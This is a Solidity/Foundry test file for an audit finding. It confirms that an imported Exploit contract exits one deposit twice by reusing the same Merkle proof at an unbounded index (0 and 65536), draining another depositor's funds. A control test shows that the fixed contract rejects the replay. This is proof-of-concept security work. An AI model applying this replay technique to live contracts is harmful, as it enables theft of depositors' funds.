// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Coin, ExitGameFixed} from
    "./13851-merklecheckmembership-allows-existence-proofs-for-the-same-l.sol";

contract Finding13851Test is Test {
    function test_exploit_same_proof_exits_deposit_twice() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.game().paid(), 2 ether, "two deposits paid");
        assertEq(e.coin().balanceOf(address(e)), 2 ether, "attacker received 2 ETH");
        assertEq(e.game().overpaid(), 1 ether, "1 ETH taken from the other depositor");
        assertEq(e.coin().balanceOf(address(e.game())), 0, "pool emptied");
        assertTrue(e.game().exited(keccak256(abi.encodePacked("deposit", e.game().depositLeaf(), uint256(0)))));
        assertTrue(e.game().exited(keccak256(abi.encodePacked("deposit", e.game().depositLeaf(), uint256(65536)))));
    }

    function test_control_index_bound_pays_once() public {
        Coin coin = new Coin();
        ExitGameFixed game = new ExitGameFixed(coin);
        coin.mint(address(game), 2 ether);

        bytes32 leaf = game.depositLeaf();
        bytes memory proof = game.proof();
        bool highOk = true;
        try game.checkMembership(leaf, 65536, game.root(), proof) returns (bool ok) {
            highOk = ok;
        } catch {
            highOk = false;
        }
        assertFalse(highOk, "high index rejected");

        game.processExit(leaf, 0, proof);
        bool secondPaid = true;
        try game.processExit(leaf, 65536, proof) {
            secondPaid = true;
        } catch {
            secondPaid = false;
        }
        assertFalse(secondPaid, "second exit reverted");
        assertEq(game.paid(), 1 ether, "only the real deposit was paid");
        assertEq(game.overpaid(), 0, "no overpayment");
        assertEq(coin.balanceOf(address(this)), 1 ether, "caller received 1 ETH");
        assertEq(coin.balanceOf(address(game)), 1 ether, "other deposit stays in the pool");
    }
}
